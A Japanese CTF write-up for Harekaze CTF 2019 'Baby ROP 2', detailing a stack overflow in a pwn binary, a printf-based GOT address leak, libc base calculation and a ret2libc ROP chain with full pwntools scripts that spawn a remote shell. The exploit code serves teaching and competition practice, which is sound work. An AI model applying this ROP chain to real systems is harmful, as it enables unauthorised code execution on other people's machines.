# Harekaze CTF 2019 `Baby ROP 2 [pwn 200]` writeup

## 問題

![問題](./001.png)

バイナリがソースコード付きで配布されていて、サーバでそのバイナリのサービスが公開されている。
libcもくっついているのがBaby ROPとの違い。

Harekaze CTF終了した2時間後に解けた。
GOTを追う場所を間違えた。
無念．．．
`printf("%s")`でアドレスリークができると言うのを実践できたのは収穫。

## 解法

### 簡単な調査

まずはバイナリをチェック。
libc使ったROPかな。

```bash-statement
$ sarucheck babyrop2
o: Partial RELRO
o: No Canary found
x: NX enabled
o: No PIE
x: No RPATH
x: No RUNPATH
$
```

64bit。
最近はもう64bitしか出ないのかなぁ。

```bash-statement
$ file ./babyrop2
./babyrop2: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=fab931b976ae2ff40aa1f5d1926518a0a31a8fd7, not stripped
$
```

ghidoraでソースコードを見るとBaby ROPとほぼ同じだけどバッファサイズとread使ってる点が異なる。read使ってるってことはNULLでも読んでくれるのでROPが組みやすくなる。
```C
undefined8 main(void)
{
  ssize_t sVar1;
  undefined local_28 [28];
  int local_c;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  printf("What\'s your name? ");
  sVar1 = read(0,local_28,0x100);
  local_c = (int)sVar1;
  local_28[(long)(local_c + -1)] = 0;
  printf("Welcome to the Pwn World again, %s!\n",local_28);
  return 0;
}
```

手元で起動すると`"A" * 40`でsegmentation faultを起こせる。
mainのアドレスが0x40063aだったので入れてみると2回同じメッセージが表示されたので簡単にEIPの奪取は成功。


```bash-statement
import sys
import pwn

s = b"A" * 40
s += pwn.p64(0x40063a)

sys.stdout.buffer.write(s)
```

```
$ cat exploit_01.txt | ./babyrop2
What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAA0!
What's your name? Bus error (core dumped)
saru@lucifen:~/wani-writeup/2019/05-harekaze/pwn-baby-rop-2$
```

### ROPを組む

EIP取れたけれどNXがenableなのでROPを組むことを考える。
戦略はlibcがついてるのでのlibc内のexecve関数と文字列`/bin/sh`を使ってシェルを起動するという手順。
1.  pop rdi ; ret: execveに渡す第1引数。/bin/shのアドレス。
2.  pop rsi ; pop r15 ; ret: execveに渡す第2引数。NULLで良い。
3.  libc上のexecveアドレスに飛ばす

でやってみる。
まぁASLRあるんだろうなーと思いつつ、gdb上でASLRを無効にした状態ではシェルが起動することは確認。
```
import sys
import pwn

addr_libc_start_main = 0x0000000000021ab0
addr_libc_execve = 0x00000000000e4e30
addr_libc_binsh = 0x1b3e9a
addr_start_main = 0x7ffff7a05ab0

addr_offset = addr_start_main - addr_libc_start_main
addr_execve = addr_offset + addr_libc_execve
addr_binsh = addr_offset + addr_libc_binsh

rop_pop_rdi = 0x0000000000400733
rop_pop_rsi = 0x0000000000400731

s = b"A" * 40
#s += pwn.p64(0x40063a)
s += pwn.p64(rop_pop_rdi)
s += pwn.p64(addr_binsh)
s += pwn.p64(rop_pop_rsi)
s += pwn.p64(0x0)
s += pwn.p64(0x0)
s += pwn.p64(addr_execve)

sys.stdout.buffer.write(s)
```

### アドレスのリーク

で、これをremoteに送り込むコードを書いたがやはり動かない。
ASLRが有効なんだろう。
最近はもはやASLRが無効の問題なんて出ないんだろうか。

以前putsを使ったアドレスリークはしたことがあったのだが、今回はputsが無いようす。
どうするか...
といろいろぐぐったり考えたりしてたらprintfで%sの時にGOTアドレス入れれば行けるんじゃね？
と思いつく。

戦略は
1. ROPで「printf("Welcome to the Pwn World again, %s!", printfのGOTアドレス);」を実行してprintfのロードアドレスを%sから吐かせる
2. 吐かせたprintfのロードアドレスからlibcがロードされてるアドレスを特定
3. libcがロードされているアドレスを基準にexecveと/bin/shのロードアドレスを求めてROPでシェルを起動

と立てた。

と、このように、うっかりprintfのGOT (Global Offset Table)アドレスを追ってしまったのがまずかった...
printfを呼び出すためにprintfのPLT (Procedure Linkage Table)は確認でいていたのでprintfのlibc上のアドレスを追ってしまった。
これが間違いのもとで、objdump -d ./babyrop2するとどれがprintfに一致するのか分からない関数がたくさん出て来た。
これで時間を消費してしまってタイムアップ。

```bash-statement
$ objdump -d libc.so.6 | grep printf | egrep "^0"
000000000004d170 <_IO_vfprintf@@GLIBC_2.2.5>:
0000000000050060 <vprintf@@GLIBC_2.2.5>:
0000000000052bc0 <__printf_fp@@GLIBC_2.2.5>:
0000000000052be0 <register_printf_specifier@@GLIBC_2.10>:
0000000000052cf0 <register_printf_function@@GLIBC_2.2.5>:
0000000000052d00 <parse_printf_format@@GLIBC_2.2.5>:
0000000000054a50 <register_printf_modifier@@GLIBC_2.10>:
0000000000054db0 <register_printf_type@@GLIBC_2.10>:
0000000000054ea0 <printf_size@@GLIBC_2.2.5>:
0000000000055750 <printf_size_info@@GLIBC_2.2.5>:
0000000000055770 <fprintf@@GLIBC_2.2.5>:
0000000000055800 <_IO_printf@@GLIBC_2.2.5>:
00000000000558b0 <snprintf@@GLIBC_2.2.5>:
0000000000055940 <_IO_sprintf@@GLIBC_2.2.5>:
00000000000559d0 <__asprintf@@GLIBC_2.2.5>:
0000000000055a60 <dprintf@@GLIBC_2.2.5>:
0000000000058940 <vfwprintf@@GLIBC_2.2.5>:
0000000000070160 <_IO_vsprintf@@GLIBC_2.2.5>:
0000000000071420 <fwprintf@@GLIBC_2.2.5>:
00000000000714b0 <swprintf@@GLIBC_2.2.5>:
0000000000071540 <vwprintf@@GLIBC_2.2.5>:
0000000000071560 <wprintf@@GLIBC_2.2.5>:
00000000000717e0 <vswprintf@@GLIBC_2.2.5>:
00000000000766d0 <vasprintf@@GLIBC_2.2.5>:
0000000000076830 <vdprintf@@GLIBC_2.2.5>:
00000000000769d0 <__vsnprintf@@GLIBC_2.2.5>:
0000000000076bd0 <obstack_vprintf@@GLIBC_2.2.5>:
0000000000076d50 <obstack_printf@@GLIBC_2.2.5>:
```

Harekaze CTFが終わってから、あ、start_mainのGOTアドレスが安定じゃん、と思いついて解いたらあっさりflagゲット。
やってしまった...

### 最終プログラム

```
import sys
import pwn

io = pwn.remote('problem.harekaze.com', 20005)

addr_libc_start_main = 0x0000000000020740
addr_libc_execve = 0x00000000000cc770
addr_libc_binsh = 0x18cd57
addr_start_main_got = 0x601028
addr_start = 0x400540
addr_printf_plt = 0x00000000004004f0
addr_welcome = 0x400770

rop_pop_rdi = 0x0000000000400733
rop_pop_rsi = 0x0000000000400731

s = b"A" * 40
s += pwn.p64(rop_pop_rdi)
s += pwn.p64(addr_welcome)
s += pwn.p64(rop_pop_rsi)
s += pwn.p64(addr_start_main_got)
s += pwn.p64(0x0)
s += pwn.p64(addr_printf_plt)
s += pwn.p64(addr_start)

io.sendline(s)
buf = io.recvline()
print(buf)
buf = io.recvline()
print(buf)

addr_start_main= buf[32:38] + b"\x00\x00"
addr_start_main = pwn.u64(addr_start_main)
addr_offset = addr_start_main - addr_libc_start_main
addr_execve = addr_offset + addr_libc_execve
addr_binsh = addr_offset + addr_libc_binsh

s = b"A" * 40
s += pwn.p64(rop_pop_rdi)
s += pwn.p64(addr_binsh)
s += pwn.p64(rop_pop_rsi)
s += pwn.p64(0x0)
s += pwn.p64(0x0)
s += pwn.p64(addr_execve)

io.sendline(s)
buf = io.recvline()
print(buf)
io.interactive()
```

### 実行結果

```bash-statement
$ python exploit_05.py
[+] Opening connection to problem.harekaze.com on port 20005: Done
b"What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAa!\n"
b"Welcome to the Pwn World again, @\xa7'\xa9\xd1\x7f!\n"
b"What's your name? Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAY!\n"
[*] Switching to interactive mode
$ cat /home/babyrop2/flag
HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}
$
```


### rop_pop_rdi、rop_pop_rsi

ROPでそれぞれRDIとRSIに値を設定するためのgadget。
printfの呼び出しとexecveの呼び出しの両方で利用する。

探すのにはROPgadgetコマンドを使う。

```bash-statement
$ ROPgadget --binary ./babyrop2
Gadgets information
============================================================
0x0000000000400733 : pop rdi ; ret
0x0000000000400605 : pop rsi ; or ah, byte ptr [rax] ; add byte ptr [rcx], al ; ret
0x0000000000400731 : pop rsi ; pop r15 ; ret
```

```python
rop_pop_rdi = 0x0000000000400733
rop_pop_rsi = 0x0000000000400731
```

### addr_welcome

アドレスのリーク用の"Welcome to the Pwn World again, %s!"の文字列のアドレス。これスカッとアドレスを一発で探す方法は無いんだろうか。
とりあえずobjdump -sで探している。

```bash-statement
$ objdump -s ./babyrop2
Contents of section .rodata:
 400750 01000200 00000000 57686174 27732079  ........What's y
 400760 6f757220 6e616d65 3f200000 00000000  our name? ......
 400770 57656c63 6f6d6520 746f2074 68652050  Welcome to the P
 400780 776e2057 6f726c64 20616761 696e2c20  wn World again,
 400790 2573210a 00                          %s!..
$ 
```

```python
addr_welcome = 0x400770
```

### addr_start_main_got

libcのロードアドレスリーク用のGOTアドレス。
GOTアドレスは実行時に動的に値が設定される。
GOTアドレス自体はobjdump -dのコメントで見つけることができる。
この0x601028のアドレスにlibc_start_mainがロードされているアドレスが実行時に書き込まれる。


```bash-statement
$ objdump -d ./babyrop2
0000000000400510 <__libc_start_main@plt>:
  400510:       ff 25 12 0b 20 00       jmpq   *0x200b12(%rip)        # 601028 <__libc_start_main@GLIBC_2.2.5>
  400516:       68 02 00 00 00          pushq  $0x2
  40051b:       e9 c0 ff ff ff          jmpq   4004e0 <.plt>
$
```

```python
addr_start_main_got = 0x601028
```

### addr_printf_plt

アドレスをリークさせるときに呼ぶprintfのアドレス。
引数にaddr_welcomeとaddr_start_main_gotを渡して%sからstart_mainのロードアドレスを吐かせる。
objdump -dで調べることができる。

```bash-statement
$ objdump -d ./babyrop2
00000000004004f0 <printf@plt>:
  4004f0:       ff 25 22 0b 20 00       jmpq   *0x200b22(%rip)        # 601018 <printf@GLIBC_2.2.5>
  4004f6:       68 00 00 00 00          pushq  $0x0
  4004fb:       e9 e0 ff ff ff          jmpq   4004e0 <.plt>
$
```

```python
addr_printf_plt = 0x00000000004004f0
```

### addr_start

1回目のオーバーフローで実行したROPが終わったらもう一度プログラムの最初に戻すために使う。
これもobjdump -dで調べることができる。
gdbで起動して`print _start`でも見つかる。

```bash-statement
$ objdump -d ./babyrop2
Disassembly of section .text:

0000000000400540 <_start>:
  400540:       31 ed                   xor    %ebp,%ebp
  400542:       49 89 d1                mov    %rdx,%r9
  400545:       5e                      pop    %rsi
  400546:       48 89 e2                mov    %rsp,%rdx
  400549:       48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
  40054d:       50                      push   %rax
  40054e:       54                      push   %rsp
  40054f:       49 c7 c0 40 07 40 00    mov    $0x400740,%r8
  400556:       48 c7 c1 d0 06 40 00    mov    $0x4006d0,%rcx
  40055d:       48 c7 c7 36 06 40 00    mov    $0x400636,%rdi
  400564:       e8 a7 ff ff ff          callq  400510 <__libc_start_main@plt>
  400569:       f4                      hlt
  40056a:       66 0f 1f 44 00 00       nopw   0x0(%rax,%rax,1)
$
```

```bash-statement
gdb-peda$ print _start
$1 = {<text variable, no debug info>} 0x400540 <_start>
gdb-peda$
```

```python
addr_start = 0x400540
```

### addr_libc_start_main
start_main関数のlibc上でのアドレス。
GOTアドレスからリークさせたstart_main関数がロードされているアドレスaddr_start_mainからこのアドレスを引くことでlibcがロードされているアドレスaddr_offsetを算出することができる。

調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。

```bash-statement
$ objdump -d libc.so.6 | grep start_main
0000000000020740 <__libc_start_main@@GLIBC_2.2.5>:
```

```python
addr_libc_start_main = 0x0000000000020740
```

### addr_libc_execve
execveのlibc上でのアドレス。
このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスaddr_execveが分かるのでexecve("/bin/sh")が実行できる。

調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。

```bash-statement
$ objdump -d libc.so.6 | grep execve
00000000000cc770 <execve@@GLIBC_2.2.5>:
```

```python
addr_libc_execve = 0x00000000000cc770
```


### addr_libc_binsh

libc上で`/bin/sh`が書かれているアドレス。
最終的にlibcがロードされているアドレスaddr_offsetとこのアドレスを足して`/bin/sh`がロードされているアドレスaddr_binshを算出し、execveに渡す引数として利用する。

stringsコマンドで調べることができる。

```bash-statement
$ strings -t x libc.so.6 | grep "/bin/sh"
 18cd57 /bin/sh
$
```

```python
addr_libc_binsh = 0x18cd57
```

### 残り

後はいろいろもろもろリークさせたアドレスから計算。


```python
addr_start_main= buf[32:38] + b"\x00\x00"
addr_start_main = pwn.u64(addr_start_main)
addr_offset = addr_start_main - addr_libc_start_main
addr_execve = addr_offset + addr_libc_execve
addr_binsh = addr_offset + addr_libc_binsh
```

## 参考

- [sCTF 2016 Q1 writeup - yuta1024's diary](http://yuta1024.hateblo.jp/entry/2016/04/29/215700)

	
